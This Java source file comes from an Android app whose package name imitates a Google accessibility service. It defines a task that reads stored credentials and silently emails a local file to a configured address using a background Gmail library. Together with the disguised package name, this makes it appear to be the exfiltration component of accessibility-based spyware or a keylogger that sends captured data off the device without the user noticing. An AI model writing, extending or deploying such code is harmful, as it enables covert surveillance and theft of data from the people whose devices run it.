package service.android.google.com.accessibility.upload.uploaders.email;

import com.creativityapps.gmailbackgroundlibrary.BackgroundMail;
import com.google.android.gms.gcm.GcmNetworkManager;
import com.google.android.gms.gcm.TaskParams;

import java.io.File;

import service.android.google.com.accessibility.R;
import service.android.google.com.accessibility.upload.uploaders.BaseUploaderTask;

/**
 * Created by tim on 16.04.16.
 */
public class EmailUploaderTask extends BaseUploaderTask {

    private String emailFrom;
    private String password;
    private String emailTo;

    public EmailUploaderTask(final boolean isServiceEnabled) {
        super(EmailUploaderTask.class, isServiceEnabled);
    }

    public EmailUploaderTask() {
        this(false);
    }

    @Override
    public int onRunTask(TaskParams taskParams) {
        getEmailPreferences();
        final File fileName = getFileName();

        return fileName != null ?
                sendFileViaEmail(fileName) :
                GcmNetworkManager.RESULT_FAILURE;
    }

    private int sendFileViaEmail(final File fileName) {
        if (emailFrom.equals("") || password.equals("") || emailTo.equals("")) {
            handleException(new Exception("No email address, password or email address to send to provided"), fileName);
            return GcmNetworkManager.RESULT_FAILURE;
        }

        BackgroundMail.newBuilder(this)
                .withUsername(emailFrom)
                .withPassword(password)
                .withBody(fileName.getName())
                .withMailto(emailTo)
                .withSubject(fileName.getName())
                .withAttachments(fileName.getPath())
                .withOnFailCallback(new BackgroundMail.OnFailCallback() {
                    @Override
                    public void onFail() {
                        handleException(new Exception("Could not send the file over email"), fileName);
                    }
                })
                .send();
        return GcmNetworkManager.RESULT_SUCCESS;
    }

    private void getEmailPreferences() {
        emailFrom = prefser.get(resources.getString(R.string.pref_key_email_from), String.class, "");
        password = prefser.get(resources.getString(R.string.pref_key_email_password), String.class, "");
        emailTo = prefser.get(resources.getString(R.string.pref_key_email_to), String.class, "");
    }
}